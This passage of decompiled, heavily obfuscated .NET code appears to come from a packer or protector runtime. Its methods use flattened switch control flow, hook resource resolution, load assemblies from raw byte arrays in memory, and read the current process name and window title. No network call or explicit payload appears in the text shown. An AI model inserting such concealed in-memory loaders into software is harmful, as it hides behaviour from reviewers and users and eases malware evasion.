          num1 = (obj as byte[])[index] < (byte) 218 ? (int) ⴍ[388] - 24 : 2;
          continue;
        case 28:
          goto label_29;
        case 29:
          \u0006.Ⴐ();
          num1 = (int) ⴍ[197];
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴈ);
          num1 = 16;
          continue;
      }
    }
label_5:
    return 4;
label_10:
    return 2;
label_15:
    return 3;
label_20:
    return 8;
label_25:
    return 0;
label_29:
    int num2 = index + 1;
    return 0;
  }

  internal static int Ⴓ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int index = 0;
    object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(359, 'Ė'), \u000E.Ⴓ(2088295582, 1, 8L, (byte) 13), 751, (short) 706);
    int num1 = (int) ⴍ[272];
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = (byte) 8 == ((byte[]) obj)[index] ? 41 : 10;
          continue;
        case 1:
          num1 = (byte) 33 == (obj as byte[])[index] ? (int) ⴍ[92] : 18;
          continue;
        case 2:
          num1 = ((byte[]) obj)[index] < (byte) 29 ? 13 : 34;
          continue;
        case 3:
          num1 = ((byte[]) obj)[index] < (byte) 33 ? (int) ⴗ[145] - 94 : 1;
          continue;
        case 4:
          goto label_39;
        case 5:
          goto label_34;
        case 6:
          ႷႳ.Ⴐ();
          num1 = 23;
          continue;
        case 7:
          num1 = ((byte[]) obj)[index] < (byte) 8 ? 22 : 0;
          continue;
        case 8:
          ++index;
          num1 = (int) ⴗ[80] - 52;
          continue;
        case 9:
          num1 = (byte) 248 == ((byte[]) obj)[index] ? (int) ⴍ[588] - (int) ⴍ[17] : 39;
          continue;
        case 10:
          ႷႳ.Ⴃ();
          num1 = 41;
          continue;
        case 11:
          \u000E.Ⴄ();
          num1 = 40;
          continue;
        case 12:
          num1 = ((byte[]) obj)[index] < (byte) 208 ? 19 : (int) ⴗ[28] - 160;
          continue;
        case 13:
          goto label_14;
        case 14:
          num1 = ((byte[]) obj)[index] < (byte) 106 ? 4 : (int) ⴍ[141];
          continue;
        case 15:
          goto label_43;
        case 17:
          num1 = (byte) 208 == (obj as byte[])[index] ? 20 : (int) ⴗ[85];
          continue;
        case 18:
          ႷႳ.Ⴐ();
          num1 = 42;
          continue;
        case 19:
          goto label_9;
        case 20:
          ++index;
          num1 = 2;
          continue;
        case 21:
          ++index;
          num1 = 25;
          continue;
        case 22:
        case 32:
          goto label_4;
        case 23:
          ++index;
          num1 = 14;
          continue;
        case 24:
          goto label_24;
        case 25:
          num1 = ((byte[]) obj)[index] < (byte) 218 ? (int) ⴍ[46] - 90 : (int) ⴍ[118];
          continue;
        case 26:
        case 44:
          num1 = (obj as byte[])[index] < (byte) 232 ? 5 : 36;
          continue;
        case 27:
          num1 = (byte) 218 == ((byte[]) obj)[index] ? 8 : 43;
          continue;
        case 28:
          goto label_3;
        case 29:
        case 31:
          goto label_19;
        case 30:
          goto label_29;
        case 33:
          ႷႳ.Ⴐ();
          num1 = 15;
          continue;
        case 34:
          num1 = (byte) 29 == ((byte[]) obj)[index] ? 40 : 11;
          continue;
        case 35:
          num1 = (obj as byte[])[index] < (byte) 248 ? (int) ⴗ[59] : (int) ⴗ[165] - 216;
          continue;
        case 36:
          num1 = (byte) 232 == (obj as byte[])[index] ? 23 : (int) ⴗ[145] - 118;
          continue;
        case 37:
          num1 = (byte) 106 == ((byte[]) obj)[index] ? 15 : (int) ⴍ[437];
          continue;
        case 38:
          \u000E.Ⴄ();
          num1 = 20;
          continue;
        case 39:
          ႷႳ.Ⴃ();
          num1 = 21;
          continue;
        case 40:
          ++index;
          num1 = (int) ⴗ[54] - 191;
          continue;
        case 41:
          ++index;
          num1 = (int) ⴗ[67] * 6;
          continue;
        case 42:
          ++index;
          num1 = 44;
          continue;
        case 43:
          ႷႰ.Ⴐ();
          num1 = (int) ⴍ[369] - 3;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴓ);
          num1 = (int) ⴗ[116];
          continue;
      }
    }
label_4:
    return 13;
label_9:
    return 4;
label_14:
    return 14;
label_19:
    return 3;
label_24:
    return 0;
label_29:
    return 7;
label_34:
    return 8;
label_39:
    return 14;
label_43:
    int num2 = index + 1;
    return 11;
  }

  internal static void Ⴀ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 1;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
        case 3:
          goto label_4;
        default:
          if (!\u0006.Ⴃ)
          {
            num1 = (int) ⴗ[94] - 250;
            continue;
          }
          goto label_12;
      }
    }
label_12:
    return;
label_4:
    object obj;
    Monitor.Enter((object) (Type) (obj = (object) typeof (\u0006)));
    try
    {
      int num2 = 6;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 7;
            continue;
          case 1:
            \u0006.Ⴗ();
            goto case 2;
          case 2:
            AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0005\u2000.Ⴄ);
            num2 = 0;
            continue;
          case 3:
            \u0006.Ⴃ = true;
            goto case 1;
          case 7:
            goto label_15;
          default:
            num2 = \u0006.Ⴃ ? (int) ⴍ[272] : 3;
            continue;
        }
      }
    }
    finally
    {
      switch (3)
      {
        default:
          Monitor.Exit((object) (obj as Type));
      }
    }
label_15:
    int num3 = 2;
    while (true)
    {
      switch (num3)
      {
        case 0:
        case 4:
        case 5:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴀ);
          num3 = 1;
          continue;
        case 1:
          goto label_19;
        default:
          num3 = 1;
          continue;
      }
    }
label_19:;
  }

  internal static object Ⴗ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    object bytes = (object) BitConverter.GetBytes(DateTime.UtcNow.Ticks);
label_4:
    AppDomain.CurrentDomain.SetData("17d17f2e15b34ff594bb793bf9620023", (object) (byte[]) bytes);
    int num = (int) ⴗ[59] - (int) ⴗ[59];
    while (true)
    {
      switch (num)
      {
        case 0:
        case 6:
          num = !BitConverter.IsLittleEndian ? 4 : 5;
          continue;
        case 1:
          goto label_3;
        case 2:
          goto label_4;
        case 4:
          goto label_7;
        case 5:
          goto label_6;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴗ);
          num = 1;
          continue;
      }
    }
label_6:
    Array.Reverse((Array) bytes);
label_7:
    Ⴍ.Ⴜ.Ⴗ[142] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[142] - (int) Ⴍ.Ⴜ.Ⴗ[131] & 207);
    return (object) null;
  }

  internal static AppDomain ႭႭ([In] int obj0, [In] char obj1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[417] - 76;
    MarshalByRefObject marshalByRefObject;
    while (true)
    {
      switch (num2)
      {
        case 0:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 1:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 2:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 3:
        case 23:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[43] + 4;
          continue;
        case 4:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[414] - 97;
          continue;
        case 5:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[146] * 9;
          continue;
        case 6:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 7:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[172] - 130;
          continue;
        case 8:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[113] / 2;
          continue;
        case 9:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 10:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 11:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[113] / 2;
          continue;
        case 12:
        case 28:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 13:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 14:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 15:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 16:
        case 45:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 17:
          goto label_93;
        case 18:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 19:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[589] - 43;
          continue;
        case 20:
          marshalByRefObject = (MarshalByRefObject) null;
          num2 = 36;
          continue;
        case 21:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 22:
          goto label_3;
        case 24:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 25:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[232] - 178;
          continue;
        case 26:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[474] - 91;
          continue;
        case 27:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[272] + 29;
          continue;
        case 29:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 30:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 31:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 32:
          int num3;
          switch ((obj0 ^ (int) obj1) - 106 ^ num1)
          {
            case 0:
              num3 = 40;
              break;
            case 1:
              num3 = 33;
              break;
            case 2:
              num3 = 49;
              break;
            case 3:
              num3 = 6;
              break;
            case 4:
              num3 = (int) ⴍ[105] / 2;
              break;
            case 5:
              num3 = 37;
              break;
            case 6:
              num3 = 13;
              break;
            case 7:
              num3 = (int) ⴗ[72] + 43;
              break;
            case 8:
              num3 = 28;
              break;
            case 9:
              num3 = 10;
              break;
            case 10:
              num3 = 48;
              break;
            case 11:
              num3 = 35;
              break;
            case 12:
              num3 = 24;
              break;
            case 13:
              num3 = 1;
              break;
            case 14:
              num3 = 39;
              break;
            case 15:
              num3 = (int) ⴗ[106] - (int) ⴗ[89];
              break;
            case 16:
              num3 = (int) ⴍ[53];
              break;
            case 17:
              num3 = (int) ⴍ[43] - 87;
              break;
            case 18:
              num3 = 0;
              break;
            case 19:
              num3 = (int) ⴍ[123];
              break;
            case 20:
              num3 = (int) ⴗ[72] + 20;
              break;
            case 21:
              num3 = 19;
              break;
            case 22:
              num3 = (int) ⴗ[109] - 135;
              break;
            case 23:
              num3 = 15;
              break;
            case 24:
              num3 = (int) ⴗ[168] - 69;
              break;
            case 25:
              num3 = (int) ⴍ[31];
              break;
            case 26:
              num3 = 44;
              break;
            case 27:
              num3 = (int) ⴗ[85];
              break;
            case 28:
              num3 = (int) ⴍ[51];
              break;
            case 29:
              num3 = 25;
              break;
            case 30:
              num3 = 34;
              break;
            case 31:
              num3 = 29;
              break;
            case 32:
              num3 = 5;
              break;
            case 33:
              num3 = 41;
              break;
            case 34:
              num3 = (int) ⴍ[550];
              break;
            case 35:
              num3 = (int) ⴗ[131] - 32;
              break;
            case 36:
              num3 = (int) ⴗ[100] - 196;
              break;
            case 37:
              num3 = 23;
              break;
            case 38:
              num3 = (int) ⴍ[107];
              break;
            case 39:
              num3 = (int) ⴗ[57] - 162;
              break;
            case 40:
              num3 = 18;
              break;
            case 41:
              num3 = 4;
              break;
            default:
              num3 = (int) ⴍ[11];
              break;
          }
          num2 = num3;
          continue;
        case 33:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 34:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 35:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[146] * 9;
          continue;
        case 36:
          ++num1;
          num2 = 390 < 780 / 2 - 265 ? 32 : 17;
          continue;
        case 37:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 38:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 39:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 40:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 41:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 42:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[62] - 188;
          continue;
        case 43:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 44:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[109] - 125;
          continue;
        case 47:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴍ[611] + 35;
          continue;
        case 48:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = (int) ⴗ[112] - 117;
          continue;
        case 49:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        case 50:
          marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
          num2 = 36;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႭ);
          num2 = 22;
          continue;
      }
    }
label_93:
    return marshalByRefObject as AppDomain;
  }

  internal static Assembly ႭႣ([In] short obj0, [In] int obj1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[272];
    ICustomAttributeProvider executingAssembly;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 2;
          continue;
        case 2:
          num3 = (int) obj0 + num3;
          num2 = num3 % 2 != 0 ? 7 : 5;
          continue;
        case 3:
        case 4:
          goto label_3;
        case 5:
          goto label_7;
        case 6:
        case 7:
          executingAssembly = (ICustomAttributeProvider) Assembly.GetExecutingAssembly();
          ++num1;
          int num4 = (int) obj0;
          num3 = num4 * num4;
          goto case 0;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႣ);
          num2 = (int) ⴍ[116] - 124;
          continue;
      }
    }
label_7:
    return (Assembly) executingAssembly;
  }

  internal static byte[] ႭႰ([In] MemoryStream obj0, [In] short obj1, [In] short obj2)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 3;
    Array array;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 8:
          array = (Array) obj0.ToArray();
          num2 = 10;
          continue;
        case 1:
        case 3:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 18 ^ num1)
          {
            case 0:
              num4 = 11;
              break;
            case 1:
              num4 = 8;
              break;
            default:
              num4 = 6;
              break;
          }
          num2 = num4;
          continue;
        case 2:
        case 7:
          num2 = num3 % 2 != 0 ? 3 : 9;
          continue;
        case 5:
          goto label_3;
        case 6:
          array = (Array) null;
          num2 = (int) ⴗ[147] - 34;
          continue;
        case 9:
          goto label_14;
        case 10:
          ++num1;
          int num5 = (int) obj1;
          int num6 = num5 * num5;
          num3 = (int) obj1 + num6;
          num2 = (int) ⴗ[72];
          continue;
        case 11:
          array = (Array) obj0.ToArray();
          num2 = (int) ⴗ[82] + 9;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႰ);
          num2 = 5;
          continue;
      }
    }
label_14:
    return (byte[]) array;
  }

  internal static Evidence ႭႤ([In] Assembly obj0, [In] int obj1, [In] int obj2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = 7;
    ICollection evidence;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
          int num5 = num3;
          int num6 = num5 * num5;
          num4 = num3 + num6;
          goto case 2;
        case 2:
          num2 = num4 % 2 != 0 ? (int) ⴍ[272] : (int) ⴍ[433] / 3;
          continue;
        case 3:
        case 5:
        case 6:
          goto label_7;
        case 4:
          goto label_3;
        case 7:
          evidence = (ICollection) obj0.Evidence;
          ++num1;
          num3 = 859;
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႤ);
          num2 = 4;
          continue;
      }
    }
label_7:
    return evidence as Evidence;
  }

  internal static Assembly ႭႷ(
    [In] byte[] obj0,
    [In] byte[] obj1,
    [In] Evidence obj2,
    [In] short obj3,
    [In] int obj4)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 2;
    ICustomAttributeProvider attributeProvider;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 1:
          num2 = 406 > num4 - num3 * 2 ? (int) ⴗ[165] - 221 : (int) ⴗ[163] - 130;
          continue;
        case 2:
          attributeProvider = (ICustomAttributeProvider) Assembly.Load(obj0, obj1, obj2);
          ++num1;
          num2 = 5;
          continue;
        case 3:
          num2 = 2;
          continue;
        case 4:
          goto label_9;
        case 5:
        case 8:
          num3 = 162;
          goto case 6;
        case 6:
          num4 = 203;
          goto case 1;
        case 7:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႷ);
          num2 = 7;
          continue;
      }
    }
label_9:
    return (Assembly) attributeProvider;
  }

  internal static Process ႭႳ([In] short obj0, [In] char obj1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[59] - (int) ⴗ[59];
    Component currentProcess;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          currentProcess = (Component) Process.GetCurrentProcess();
          ++num1;
          num3 = 740;
          goto case 5;
        case 1:
        case 2:
          int num4 = 88;
          num2 = 185 < num3 / 4 - num4 ? 0 : (int) ⴍ[272];
          continue;
        case 3:
          goto label_3;
        case 5:
          num2 = 2;
          continue;
        case 7:
          goto label_7;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႳ);
          num2 = (int) ⴍ[433] / 6;
          continue;
      }
    }
label_7:
    return currentProcess as Process;
  }

  internal static string ႭႼ([In] Process obj0, [In] char obj1, [In] char obj2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 4;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          obj = (object) null;
          num2 = 9;
          continue;
        case 1:
        case 3:
          goto label_15;
        case 2:
          num2 = 9;
          continue;
        case 4:
        case 11:
          int num4;
          switch (((int) obj1 ^ (int) obj2) - 9 ^ num1)
          {
            case 0:
              num4 = (int) ⴍ[453] - 173;
              break;
            case 1:
              num4 = 7;
              break;
            default:
              num4 = 0;
              break;
          }
          num2 = num4;
          continue;
        case 5:
          obj = (object) obj0.ProcessName;
          goto case 2;
        case 6:
          num2 = num3 % 2 != 0 ? 4 : (int) ⴗ[82];
          continue;
        case 7:
          obj = (object) obj0.MainWindowTitle;
          num2 = 9;
          continue;
        case 9:
          ++num1;
          int num5 = (int) obj2;
          int num6 = num5 * num5;
          int num7 = (int) obj2;
          int num8 = num6;
          Ⴍ.Ⴜ.Ⴗ[31] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[31] ^ (int) \u0003\u2002.Ⴍ[476]) & 55);
          num3 = num7 + num8;
          num2 = 6;
          continue;
        case 10:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.ႭႼ);
          num2 = (int) ⴍ[14] - 122;
          continue;
      }
    }
label_15:
    return obj as string;
  }

  internal sealed class ႭႠ
  {
    internal uint Ⴈ;
    internal uint Ⴓ;
    internal uint Ⴄ;

    internal ႭႠ()
    {
    }
  }
}
